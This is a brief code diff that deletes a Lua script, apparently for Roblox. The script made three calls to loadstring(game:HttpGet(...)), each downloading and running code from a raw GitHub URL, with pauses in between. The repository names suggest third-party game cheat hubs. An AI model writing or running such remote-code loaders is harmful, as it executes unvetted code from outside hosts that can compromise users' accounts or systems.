@@ -1,6 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad6196/Project-WD/main/Mainstring.lua"))()
-wait( 90 )
-loadstring(game:HttpGet("https://raw.githubusercontent.com/tpvy/tpvy/main/muraz-simX-v2", true))()
-wait( 30 )
-loadstring(game:HttpGet("https://raw.githubusercontent.com/tpvy/muzarhub/main/muzarhub", true))()
-
